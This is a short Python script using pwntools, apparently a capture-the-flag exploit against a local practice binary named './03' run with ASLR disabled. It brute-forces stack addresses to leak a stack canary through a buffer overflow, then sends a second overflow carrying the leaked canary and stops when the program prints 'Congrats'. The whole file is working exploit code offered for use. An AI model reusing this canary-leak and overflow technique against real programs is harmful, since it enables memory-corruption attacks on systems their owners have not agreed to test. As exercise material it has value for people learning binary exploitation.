from pwn import *


maxAdress = 0x7ffffffff000
minAdress = 0x7fffffffb000
rangeAdress = int(maxAdress - minAdress)
for i in range (maxAdress,minAdress, -0x8):
    correctedStart = int(i) - int(minAdress)
    howmuchdone = (correctedStart * 100) / rangeAdress
    #print(howmuchdone)
    io = process(['setarch','-R', './03'])

    io.send(cyclic(24) + p64(i))
    io.shutdown('out')
    maybeCanary = io.recvuntil(b'.').strip().decode().split(' ')[-1].replace('line)\n', '').replace('.', '')
    maybeCanary = maybeCanary.replace('line)', '')


    try:
        canary = p64(int(maybeCanary, 16))
        io.send(cyclic(48) + canary)
    except:
        io.close()
        continue

    print(f"Maybe canary is: {maybeCanary}")



    io.shutdown('out')

    if b'Congrats' in io.readall():
        print(i)
        break

    io.close()



